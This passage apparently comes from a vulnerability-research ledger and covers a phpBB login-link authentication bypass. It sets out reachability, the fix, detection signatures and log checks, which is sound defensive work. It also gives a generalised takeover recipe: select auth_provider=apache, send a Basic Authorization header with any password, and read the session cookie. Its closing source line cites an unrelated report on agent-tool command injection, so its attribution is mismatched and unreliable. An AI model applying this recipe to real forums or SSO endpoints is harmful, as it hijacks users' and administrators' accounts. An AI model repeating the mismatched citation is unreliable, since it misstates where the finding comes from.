  5. THE DEFAULT-INSTALL REACHABILITY — the vulnerable OAuth/login-link code paths are active even when NO OAuth provider has been configured; a stock phpBB install using only database authentication still exposes the endpoint. Disabling OAuth providers in the ACP does not eliminate it.
  6. THE FIX (3.3.17) — `ucp.php?mode=login_link` now issues a 301 redirect to an OAuth controller and the auth provider is sourced from server-side configuration; the `auth_provider` query parameter is no longer accepted.
DETECTION SIGNAL: a login / account-linking / SSO endpoint with a provider/backend selector parameter (`auth_provider`, `provider`, `method`, `type`, `driver`, `flow`); a provider value that maps to a header-based or passwordless backend (`apache`, `basic`, `htpasswd`, `ldap`, `saml`, `cas`, `oauth`, `native`); a request carrying an `Authorization: Basic` header with a blank/arbitrary password that returns a session cookie; a default installation with the OAuth feature apparently disabled still exposing the link flow; a WAF/log signature of `auth_provider=apache` together with `login_link_*` parameters.
CHAIN: an unauthenticated attacker (primitive: no credentials, no victim interaction) -> reaches the public login-link endpoint -> sets `auth_provider=apache` to select the Basic-auth backend (primitive: the provider is client-controlled) -> the backend trusts the `Authorization` header's username with NO password check (primitive: an authentication path that assumes an upstream layer already verified the password) -> the attacker supplies any username (e.g. `admin`) with any password (escalation: password verification is skipped entirely) -> a session cookie for the victim account is issued (impact: full account takeover, administrator included; CVSS 9.8 Critical). Per doctrine §8: preconditions = none; gain = an authenticated session for any account on the forum.
TRANSFERABLE TEST: for EVERY login / account-linking / SSO endpoint with a provider or backend selector parameter — (1) enumerate the parameter (`auth_provider`, `provider`, `method`, `type`, `driver`, `flow`) and fuzz its accepted values (`apache`, `basic`, `htpasswd`, `ldap`, `oauth`, `google`, `github`, `saml`, `cas`, `db`, `native`); (2) for each value, send the login request with the corresponding header (`Authorization: Basic base64(<victim>:<anything>)`) and a blank or arbitrary password; (3) a 302 + session cookie for the victim account (or a "logged in" redirect) is the finding; (4) confirm the same request works on a default install with the feature seemingly disabled; (5) test whether the parameter is also accepted on the MAIN login route, not just the link route; (6) check the server's access logs for the signature `auth_provider=apache` + `login_link_*` to detect prior exploitation. Rule: **a provider-selector parameter that lets you choose a header-based/passwordless auth backend turns a login form into a password-free account takeover — set `auth_provider=apache`, send `Authorization: Basic base64(victim:anything)`, and read the session cookie.**
DEDUPE: 0 hits across all three write targets for `phpbb`, `auth_provider`, `48611`, `login_link`, `apache provider`, `CVE-2026-48611`. The `apache` hits in the ledger are Apache HTTP Server advisories (CVE-2024-38472, CVE-2021-41773/42013, request-smuggling), not a phpBB provider-selector bug; the `auto_approve` hits are Doorkeeper OAuth consent flags. New general method -> §17.380.

SOURCE: https://hackerone.com/reports/4077800 (AWS VDP, "Unescaped consent-prompt renderer (HTML()) enables concealed-approval OS command injection in strands-agents/tools use_computer — RCE") + GHSA-mqvc-p852-wf8x / CVE-2026-18733  2026-11-10
